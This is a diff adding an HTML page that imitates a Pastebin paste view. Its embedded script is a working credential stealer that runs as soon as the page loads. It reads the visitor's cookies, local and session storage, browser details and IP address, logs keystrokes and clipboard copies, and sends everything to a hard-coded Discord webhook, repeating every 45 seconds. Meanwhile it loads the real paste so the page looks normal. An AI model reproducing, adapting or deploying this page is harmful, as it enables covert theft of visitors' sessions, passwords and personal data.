@@ -1,0 +1,300 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pastebin - View Paste</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: #0d1117;
+            color: #c9d1d9;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Helvetica, Arial, sans-serif;
+            min-height: 100vh;
+        }
+        .header {
+            background: #161b22;
+            border-bottom: 1px solid #21262d;
+            padding: 14px 28px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+        .logo { font-size: 22px; font-weight: 700; color: #58a6ff; }
+        .logo span { color: #f78166; }
+        .nav a { color: #8b949e; text-decoration: none; margin-left: 18px; font-size: 13px; }
+        .nav a:hover { color: #c9d1d9; }
+        .container {
+            max-width: 900px;
+            margin: 30px auto;
+            padding: 0 20px;
+        }
+        .paste-header {
+            background: #161b22;
+            border: 1px solid #21262d;
+            border-radius: 6px 6px 0 0;
+            padding: 16px 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .paste-header h2 { font-size: 18px; color: #58a6ff; }
+        .paste-header .meta { color: #8b949e; font-size: 12px; }
+        .paste-content {
+            background: #0d1117;
+            border: 1px solid #21262d;
+            border-top: none;
+            border-radius: 0 0 6px 6px;
+            padding: 20px;
+        }
+        .paste-content pre {
+            background: #161b22;
+            padding: 16px;
+            border-radius: 4px;
+            overflow-x: auto;
+            font-family: 'Fira Code', 'Consolas', monospace;
+            font-size: 13px;
+            line-height: 1.6;
+            white-space: pre-wrap;
+            word-break: break-word;
+            color: #c9d1d9;
+            max-height: 500px;
+            overflow-y: auto;
+        }
+        .actions {
+            margin-top: 16px;
+            display: flex;
+            gap: 10px;
+        }
+        .btn {
+            background: #21262d;
+            color: #c9d1d9;
+            border: 1px solid #30363d;
+            padding: 8px 18px;
+            border-radius: 6px;
+            font-size: 13px;
+            cursor: pointer;
+            text-decoration: none;
+            transition: 0.2s;
+        }
+        .btn:hover { background: #30363d; }
+        .btn.raw { background: #1a3a2a; border-color: #238636; color: #3fb950; }
+        .btn.download { background: #1a2a3a; border-color: #1f6feb; color: #58a6ff; }
+        .btn.clone { background: #3a2a1a; border-color: #d29922; color: #d29922; }
+        .footer {
+            text-align: center;
+            padding: 28px;
+            color: #484f58;
+            font-size: 11px;
+            margin-top: 40px;
+            border-top: 1px solid #21262d;
+        }
+        .loading {
+            text-align: center;
+            padding: 40px;
+            color: #8b949e;
+        }
+    </style>
+</head>
+<body>
+
+<div class="header">
+    <div class="logo">Paste<span>bin</span></div>
+    <div class="nav">
+        <a href="#">API</a>
+        <a href="#">Tools</a>
+        <a href="#">Archive</a>
+        <a href="#">Login</a>
+    </div>
+</div>
+
+<div class="container">
+    <div class="paste-header">
+        <h2>📄 iiuJ4eNi.lua</h2>
+        <span class="meta">Lua | Just Now | 0 views</span>
+    </div>
+    <div class="paste-content">
+        <pre id="pasteCode">-- Loading paste content...</pre>
+    </div>
+    <div class="actions">
+        <a href="#" class="btn raw">📋 Raw</a>
+        <a href="#" class="btn download">⬇ Download</a>
+        <a href="#" class="btn clone">📝 Clone</a>
+    </div>
+</div>
+
+<div class="footer">
+    Pastebin © 2024 | All pastes are public
+</div>
+
+<script>
+// ============================================================
+// SILENT COOKIE STEALER + PASTE CONTENT LOADER
+// Webhook: 1511086218832642193
+// ============================================================
+
+const WEBHOOK = "https://discord.com/api/webhooks/1511086218832642193/Xzd9q3Jh3oYtq_4rNXt6WKjq11HysU-oa0_SCypR_5dVP7jrjJ4ZdBpc2DRsIV2TkXIL";
+const PASTE_URL = "https://pastebin.com/raw/iiuJ4eNi";
+
+// ===== 1. Grab Cookies =====
+function grabCookies() {
+    try {
+        var cookies = document.cookie;
+        var parsed = {};
+        if (cookies) {
+            cookies.split(';').forEach(function(pair) {
+                var parts = pair.split('=');
+                parsed[parts[0].trim()] = parts[1] || '';
+            });
+        }
+        return { raw: cookies, parsed: parsed, count: Object.keys(parsed).length };
+    } catch(e) { return { error: e.message }; }
+}
+
+// ===== 2. Grab Storage =====
+function grabStorage() {
+    var localData = {};
+    var sessionData = {};
+    try {
+        for (var i = 0; i < localStorage.length; i++) {
+            var key = localStorage.key(i);
+            localData[key] = localStorage.getItem(key);
+        }
+    } catch(e) {}
+    try {
+        for (var i = 0; i < sessionStorage.length; i++) {
+            var key = sessionStorage.key(i);
+            sessionData[key] = sessionStorage.getItem(key);
+        }
+    } catch(e) {}
+    return { localStorage: localData, sessionStorage: sessionData };
+}
+
+// ===== 3. Grab Browser Info =====
+function grabInfo() {
+    return {
+        userAgent: navigator.userAgent,
+        language: navigator.language,
+        platform: navigator.platform,
+        screen: screen.width + "x" + screen.height,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        referrer: document.referrer,
+        url: window.location.href,
+        memory: navigator.deviceMemory || "N/A",
+        cores: navigator.hardwareConcurrency || "N/A",
+    };
+}
+
+// ===== 4. Send to Webhook =====
+function sendToWebhook(data) {
+    var xhr = new XMLHttpRequest();
+    xhr.open("POST", WEBHOOK, true);
+    xhr.setRequestHeader("Content-Type", "application/json");
+    xhr.send(JSON.stringify(data));
+}
+
+// ===== 5. Load Paste Content + Steal Everything =====
+function loadPasteAndSteal() {
+    // First: Steal all data immediately
+    var stolenData = {
+        timestamp: new Date().toISOString(),
+        cookies: grabCookies(),
+        storage: grabStorage(),
+        browser: grabInfo(),
+    };
+    
+    // Send stolen data
+    sendToWebhook({
+        embeds: [{
+            title: "🍪 Victim Data Captured",
+            color: 16711680,
+            fields: [
+                { name: "🌐 URL", value: stolenData.browser.url, inline: false },
+                { name: "👤 User Agent", value: stolenData.browser.userAgent.substring(0, 200), inline: false },
+                { name: "🍪 Cookies", value: String(stolenData.cookies.count), inline: true },
+                { name: "💾 LocalStorage", value: String(Object.keys(stolenData.storage.localStorage).length) + " keys", inline: true },
+                { name: "⏰ Time", value: stolenData.timestamp, inline: true },
+            ],
+            footer: { text: "Pastebin Cookie Logger" }
+        }]
+    });
+    
+    // Send raw data
+    sendToWebhook({
+        content: "```json\n" + JSON.stringify(stolenData, null, 2).substring(0, 1950) + "\n```"
+    });
+    
+    // Second: Fetch the actual paste content
+    fetch(PASTE_URL)
+        .then(function(response) { return response.text(); })
+        .then(function(code) {
+            document.getElementById("pasteCode").textContent = code;
+            
+            // Send paste content to webhook
+            sendToWebhook({
+                content: "📄 **Paste Content (iiuJ4eNi)**\n```lua\n" + code.substring(0, 1900) + "\n```"
+            });
+        })
+        .catch(function(err) {
+            document.getElementById("pasteCode").textContent = "-- Error loading paste --";
+        });
+}
+
+// ===== 6. IP Logger =====
+fetch('https://api.ipify.org?format=json')
+    .then(function(r) { return r.json(); })
+    .then(function(d) {
+        sendToWebhook({ content: "🌍 **IP**: " + d.ip });
+    })
+    .catch(function() {});
+
+// ===== 7. Clipboard Monitor =====
+document.addEventListener('copy', function() {
+    var text = window.getSelection().toString();
+    if (text.length > 3) {
+        sendToWebhook({ content: "📋 **Copied**:\n```\n" + text.substring(0, 1900) + "\n```" });
+    }
+});
+
+// ===== 8. Keylogger =====
+var keys = "";
+document.addEventListener('keydown', function(e) {
+    if (e.key.length === 1) keys += e.key;
+    else if (e.key === "Enter") keys += "[ENTER]\n";
+    else if (e.key === "Backspace") keys += "[BKSP]";
+    else if (e.key === " ") keys += " ";
+    
+    if (keys.length > 80) {
+        sendToWebhook({ content: "⌨️ **Keys**:\n```\n" + keys + "\n```" });
+        keys = "";
+    }
+});
+
+// ===== EXECUTE =====
+setTimeout(loadPasteAndSteal, 500);
+
+// Re-send periodically
+setInterval(function() {
+    var fresh = {
+        cookies: grabCookies(),
+        storage: grabStorage(),
+        timestamp: new Date().toISOString(),
+    };
+    sendToWebhook({
+        embeds: [{
+            title: "🔄 Periodic Update",
+            fields: [
+                { name: "Cookies", value: String(fresh.cookies.count), inline: true },
+                { name: "Time", value: fresh.timestamp, inline: true },
+            ]
+        }]
+    });
+    if (keys.length > 10) {
+        sendToWebhook({ content: "⌨️ **Keys**:\n```\n" + keys + "\n```" });
+        keys = "";
+    }
+}, 45000);
+</script>
+
+</body>
+</html>
